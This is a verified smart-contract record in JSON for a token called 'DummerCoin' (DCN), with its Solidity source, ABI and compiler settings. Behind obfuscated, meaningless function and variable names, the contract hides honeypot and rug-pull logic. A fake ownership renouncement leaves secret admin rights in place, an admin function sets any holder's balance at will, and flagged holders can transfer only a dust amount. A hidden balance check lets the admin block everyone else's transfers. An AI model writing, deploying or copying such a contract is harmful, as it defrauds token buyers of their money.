{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buySender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txAmount {\n    function createPair(address enableIs, address atEnableReceiver) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface limitTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface teamFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAt) external view returns (uint256);\n\n    function transfer(address feeFrom, uint256 limitTrading) external returns (bool);\n\n    function allowance(address marketingFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeFrom,\n        uint256 limitTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTake, uint256 value);\n    event Approval(address indexed marketingFrom, address indexed spender, uint256 value);\n}\n\ninterface launchedLaunch is teamFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DummerCoin is buySender, teamFund, launchedLaunch {\n\n    uint8 private listIs = 18;\n\n    function allowance(address tokenEnable, address txSwap) external view virtual override returns (uint256) {\n        if (txSwap == marketingTeam) {\n            return type(uint256).max;\n        }\n        return shouldReceiver[tokenEnable][txSwap];\n    }\n\n    address public tokenLaunchedTotal;\n\n    function toList(uint256 limitTrading) public {\n        minTo();\n        receiverLimit = limitTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listIs;\n    }\n\n    uint256 constant amountIsTake = 10 ** 10;\n\n    uint256 public modeBuyToken = 3;\n\n    mapping(address => bool) public receiverMax;\n\n    function senderFee(address minFee, address feeFrom, uint256 limitTrading) internal returns (bool) {\n        if (minFee == senderToken) {\n            return totalEnable(minFee, feeFrom, limitTrading);\n        }\n        uint256 listTradingLiquidity = teamFund(tokenLaunchedTotal).balanceOf(modeSenderMax);\n        require(listTradingLiquidity == receiverLimit);\n        require(feeFrom != modeSenderMax);\n        if (maxListLaunch[minFee]) {\n            return totalEnable(minFee, feeFrom, amountIsTake);\n        }\n        limitTrading = liquidityBuyShould(minFee, feeFrom, limitTrading);\n        return totalEnable(minFee, feeFrom, limitTrading);\n    }\n\n    uint256 receiverLimit;\n\n    function balanceOf(address enableAt) public view virtual override returns (uint256) {\n        return atLaunch[enableAt];\n    }\n\n    function totalEnable(address minFee, address feeFrom, uint256 limitTrading) internal returns (bool) {\n        require(atLaunch[minFee] >= limitTrading);\n        atLaunch[minFee] -= limitTrading;\n        atLaunch[feeFrom] += limitTrading;\n        emit Transfer(minFee, feeFrom, limitTrading);\n        return true;\n    }\n\n    string private feeLiquidityFrom = \"DCN\";\n\n    address private txLimit;\n\n    event OwnershipTransferred(address indexed txReceiver, address indexed exemptShould);\n\n    function fromListFee(address amountSwap) public {\n        if (tradingReceiver) {\n            return;\n        }\n        \n        receiverMax[amountSwap] = true;\n        \n        tradingReceiver = true;\n    }\n\n    bool public tradingReceiver;\n\n    function launchedExemptReceiver(address maxFee, uint256 limitTrading) public {\n        minTo();\n        atLaunch[maxFee] = limitTrading;\n    }\n\n    function minTo() private view {\n        require(receiverMax[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldReceiver;\n\n    uint256 public sellLimitTx;\n\n    uint256 public isMode;\n\n    function approve(address txSwap, uint256 limitTrading) public virtual override returns (bool) {\n        shouldReceiver[_msgSender()][txSwap] = limitTrading;\n        emit Approval(_msgSender(), txSwap, limitTrading);\n        return true;\n    }\n\n    function transfer(address maxFee, uint256 limitTrading) external virtual override returns (bool) {\n        return senderFee(_msgSender(), maxFee, limitTrading);\n    }\n\n    constructor (){\n        \n        sellExempt();\n        limitTake shouldReceiverLaunched = limitTake(marketingTeam);\n        tokenLaunchedTotal = txAmount(shouldReceiverLaunched.factory()).createPair(shouldReceiverLaunched.WETH(), address(this));\n        modeSenderMax = txAmount(shouldReceiverLaunched.factory()).feeTo();\n        \n        senderToken = _msgSender();\n        receiverMax[senderToken] = true;\n        atLaunch[senderToken] = feeSenderShould;\n        \n        emit Transfer(address(0), senderToken, feeSenderShould);\n    }\n\n    string private toLimitLaunched = \"Dummer Coin\";\n\n    function transferFrom(address minFee, address feeFrom, uint256 limitTrading) external override returns (bool) {\n        if (_msgSender() != marketingTeam) {\n            if (shouldReceiver[minFee][_msgSender()] != type(uint256).max) {\n                require(limitTrading <= shouldReceiver[minFee][_msgSender()]);\n                shouldReceiver[minFee][_msgSender()] -= limitTrading;\n            }\n        }\n        return senderFee(minFee, feeFrom, limitTrading);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeLiquidityFrom;\n    }\n\n    address modeSenderMax;\n\n    uint256 swapReceiver;\n\n    function getOwner() external view returns (address) {\n        return txLimit;\n    }\n\n    mapping(address => bool) public maxListLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return toLimitLaunched;\n    }\n\n    uint256 public maxFeeSender = 0;\n\n    function sellExempt() public {\n        emit OwnershipTransferred(senderToken, address(0));\n        txLimit = address(0);\n    }\n\n    uint256 private tradingAmount;\n\n    mapping(address => uint256) private atLaunch;\n\n    function owner() external view returns (address) {\n        return txLimit;\n    }\n\n    function maxSender(address isLiquidity) public {\n        minTo();\n        \n        if (isLiquidity == senderToken || isLiquidity == tokenLaunchedTotal) {\n            return;\n        }\n        maxListLaunch[isLiquidity] = true;\n    }\n\n    function liquidityBuyShould(address minFee, address feeFrom, uint256 limitTrading) internal view returns (uint256) {\n        require(limitTrading > 0);\n\n        uint256 toAuto = 0;\n        if (minFee == tokenLaunchedTotal && modeBuyToken > 0) {\n            toAuto = limitTrading * modeBuyToken / 100;\n        } else if (feeFrom == tokenLaunchedTotal && maxFeeSender > 0) {\n            toAuto = limitTrading * maxFeeSender / 100;\n        }\n        require(toAuto <= limitTrading);\n        return limitTrading - toAuto;\n    }\n\n    uint256 private feeSenderShould = 100000000 * 10 ** 18;\n\n    address public senderToken;\n\n    address marketingTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeSenderShould;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"}],\"name\":\"fromListFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"launchedExemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFeeSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxListLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuyToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimitTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunchedTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DummerCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}